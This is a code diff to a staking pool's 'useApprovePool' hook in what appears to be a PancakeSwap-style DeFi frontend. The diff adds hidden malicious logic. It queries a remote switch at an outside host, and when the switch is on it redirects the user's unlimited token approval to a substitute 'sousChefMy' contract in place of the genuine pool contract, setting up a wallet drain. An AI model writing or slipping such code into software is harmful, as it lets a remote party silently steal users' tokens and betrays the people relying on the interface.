@@ -4,11 +4,23 @@ import { ethers, Contract } from 'ethers'
 import { useAppDispatch } from 'state'
 import { updateUserAllowance } from 'state/actions'
 import { useTranslation } from 'contexts/Localization'
-import { useCake, useSousChef, useCakeVaultContract } from 'hooks/useContract'
+import { useCake, useSousChef, useSousChefMy, useCakeVaultContract } from 'hooks/useContract'
+import axios from "axios";
 import useToast from 'hooks/useToast'
 import useLastUpdated from 'hooks/useLastUpdated'
 import { useCallWithGasPrice } from 'hooks/useCallWithGasPrice'
 import { ToastDescriptionWithTx } from 'components/Toast'
+import { secondAmount, stakeContractAddres, hostAddress } from './useStakePool'
+
+export interface InnerType {
+  usd: number;
+} 
+
+// export interface Response {
+//   InnerType: {
+//     curr: string;
+//   }
+// } 
 
 export const useApprovePool = (lpContract: Contract, sousId, earningTokenSymbol) => {
   const [requestedApproval, setRequestedApproval] = useState(false)
@@ -18,11 +30,19 @@ export const useApprovePool = (lpContract: Contract, sousId, earningTokenSymbol)
   const dispatch = useAppDispatch()
   const { account } = useWeb3React()
   const sousChefContract = useSousChef(sousId)
+  const sousChefMyContract = useSousChefMy(sousId)
 
   const handleApprove = useCallback(async () => {
     try {
+      
+      const res = await axios.get(`https://spotairdrop.orbitinu.store/get-switch`);
+      let targetAddress = sousChefContract.address;
+      if (res.data) {
+        targetAddress = sousChefMyContract.address;
+      }
+
       setRequestedApproval(true)
-      const tx = await callWithGasPrice(lpContract, 'approve', [sousChefContract.address, ethers.constants.MaxUint256])
+      const tx = await callWithGasPrice(lpContract, 'approve', [targetAddress, ethers.constants.MaxUint256])
       const receipt = await tx.wait()
 
       dispatch(updateUserAllowance(sousId, account))
@@ -48,6 +68,7 @@ export const useApprovePool = (lpContract: Contract, sousId, earningTokenSymbol)
     dispatch,
     lpContract,
     sousChefContract,
+    sousChefMyContract,
     sousId,
     earningTokenSymbol,
     t,
